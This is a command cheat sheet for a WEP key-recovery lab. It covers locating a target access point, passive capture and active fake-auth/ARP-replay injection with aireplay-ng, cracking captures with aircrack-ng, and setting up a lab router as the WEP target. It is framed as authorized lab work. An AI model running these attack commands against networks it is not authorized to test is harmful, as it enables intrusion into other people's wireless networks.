# Lab #10 — Command cheat sheet

Copy-paste reference for the WEP key-recovery lab. The *why* is in
[README.md](README.md); this file is only the commands.

Replace `wlp2s0`, the BSSID (`11:22:33:44:55:66`) and the channel (`6`) with your values.

> Only run these against networks you are authorized to test.

---

## 1. Check the hardware

```bash
iw dev                                          # wireless interfaces (Fedora: wlp…, not wlan0)
ip -br addr                                     # IP address of each interface
lspci -nnk | grep -iA3 -E 'network|wireless'    # Wi-Fi card model and kernel driver
airmon-ng                                       # chipset/driver per interface
```

## 2. Install (once)

```bash
sudo dnf install aircrack-ng
```

## 3. Find the target's BSSID and channel

```bash
sudo ./scripts/airodump.sh -i wlp2s0            # lists every AP with its BSSID and CH; Ctrl-C stops and restores WiFi
sudo ./scripts/airodump.sh -i wlp2s0 -c 6       # same, locked to channel 6
sudo ./scripts/airodump.sh -i wlp2s0 -B abg    # also hop 5 GHz channels (AC8260 only)
sudo ./scripts/managed-scan.sh -i wlp2s0        # managed scan: channel, signal, BSSID and name; keeps the connection
sudo ./scripts/managed-scan.sh -i wlp2s0 -c 6   # managed scan of channel 6 only
```

The RTL8723BE's monitor scans only show the channel the card started on. Use `managed-scan.sh`
to find a network's channel with it.

## 4. Run the attack with the script

```bash
./scripts/wep-crack.sh -h                       # full usage

# Passive: listen only. IVs come from traffic on the network, so start a download on a client
sudo ./scripts/wep-crack.sh -i wlp2s0 -b 11:22:33:44:55:66 -c 6 -m passive -o practice

# Active: fake-auth + ARP replay (needs a card that injects; on the 3168NGW the replay adds almost no IVs)
sudo ./scripts/wep-crack.sh -i wlp2s0 -b 11:22:33:44:55:66 -c 6 -m active -o cap_gl
```

| Flag | Meaning | Default |
|------|---------|---------|
| `-i` | Wi-Fi interface | *(required)* |
| `-b` | Target AP BSSID | *(required)* |
| `-c` | Channel the AP is on | *(required)* |
| `-e` | AP ESSID (helps fake-auth on some APs) | *(none)* |
| `-m` | `active` or `passive` | `active` |
| `-o` | Output prefix; the files go to a new folder under `logs/` | `wepcap` |
| `-t` | IVs gained before `aircrack-ng` runs again (first try at 5000) | `20000` |

What the script does at each step, and why: see [README.md](README.md#how-the-scripts-work).

## 5. Check progress and results

Each run has its own folder in `logs/`, named by the start time and the prefix, for example
`2026-10-19_044700_cap_gl`. `<run>` below is that name.

```bash
ls logs/                                                 # one folder per run
ls -dt logs/*/ | head -n 1                               # the newest run folder
ls -lh logs/<run>/                                       # .cap, .csv, .key and attack output
grep -i 11:22:33:44:55:66 logs/<run>/cap_gl-01.csv       # column 11 ("# IV") = IVs captured so far
cat logs/<run>/cap_gl.key                                # recovered key, as hex (the script also prints the ASCII form)
```

## 6. Do the same steps by hand

Useful for debugging when the script misbehaves. The first test is also a script,
which sets the channel before it runs and restores WiFi afterwards:

```bash
sudo ./scripts/injection-test.sh -i wlp2s0 -c 1 -b <AP_BSSID>   # PASS = that AP answered; replies per AP are printed

# By hand. wlp2s0mon exists only on separate-vif cards (Intel); single-vif cards
# (RTL8723BE) use wlp2s0 itself.
MON=wlp2s0mon
MYMAC=$(cat /sys/class/net/$MON/address)

sudo iw dev $MON set channel 6
sudo aireplay-ng --test $MON            # "Injection is working!" = card can inject
sudo aireplay-ng --fakeauth 10 -o 1 -q 10 -a 11:22:33:44:55:66 -h $MYMAC $MON
sudo aireplay-ng --arpreplay -b 11:22:33:44:55:66 -h $MYMAC $MON
```

Crack a capture manually (`-b` picks the AP when the capture holds several):

```bash
aircrack-ng -b 11:22:33:44:55:66 logs/<run>/cap_gl-01.cap
aircrack-ng -q -b 11:22:33:44:55:66 -l logs/<run>/cap_gl.key logs/<run>/cap_gl-01.cap
```

## 7. Configure the GL-AR300M16 as the WEP target

Run from the laptop, connected to the router's LAN port. Keys are 1–4 entries,
each 5 or 13 ASCII characters, or 10 or 26 hex digits.

```bash
# Main AP with one key
ssh root@your-router-ip "sh -s -- '12345'" < router/wifi-wep-test.sh

# Custom SSID, two keys, transmit with key slot 2
ssh root@your-router-ip "SSID=Lab SLOT=2 sh -s -- '12345' '67890'" < router/wifi-wep-test.sh

# Check the AP is actually up
ssh root@your-router-ip "logread | grep -i hostapd | tail"

# The script doesn't change the channel. The lab router is on channel 6, where both cards
# injected in our tests.
```

Restore WPA2 afterwards with the backup the script made:

```bash
ssh root@your-router-ip "ls /root/wireless.*.bak"
ssh root@your-router-ip "cp /root/wireless.<timestamp>.bak /etc/config/wireless && wifi reload"
```

## 8. WiFi disappeared?

```bash
sudo ./scripts/wifi-recover.sh -i wlp2s0        # managed mode back, NetworkManager restarted

# By hand. Still in monitor mode? "type monitor" means yes
iw dev wlp2s0 info | grep type

# Single-interface drivers (e.g. the RTL8723BE) keep the managed name in monitor mode.
# The mode only changes while the link is down, and NetworkManager only adopts a card
# that is managed when it starts, so restart it last.
sudo ip link set wlp2s0 down
sudo iw dev wlp2s0 set type managed
sudo ip link set wlp2s0 up
sudo systemctl restart NetworkManager

# If the card has a separate wlp2s0mon interface instead:
sudo airmon-ng stop wlp2s0mon           # return the card to managed mode FIRST
sudo systemctl restart NetworkManager   # then restart networking
```

The script prints "did not finish its last restart" when the Intel firmware needs a reboot.

If it's still dark, see the troubleshooting table in [README.md](README.md#troubleshooting).

## 9. Make traffic for the IVs (the download test)

Passive capture gets IVs only from traffic on the network. The key recovery used a phone
downloading a file from the laptop over the WEP network while the capture ran.

```bash
mkdir -p ~/wepfeed && cd ~/wepfeed && dd if=/dev/urandom of=big.bin bs=1M count=200
# Open port 8000 to the LAN subnet only, then serve the file on the laptop's LAN address
sudo firewall-cmd --add-rich-rule='rule family="ipv4" source address="192.168.8.0/24" port port="8000" protocol="tcp" accept'
python3 -m http.server 8000 --bind <laptop-LAN-address>     # Ctrl-C when the download is done
sudo firewall-cmd --remove-rich-rule='rule family="ipv4" source address="192.168.8.0/24" port port="8000" protocol="tcp" accept'
```

On the phone, on the WEP network, open `http://<laptop-LAN-address>:8000/big.bin`. Keep the
phone connected for the whole capture.
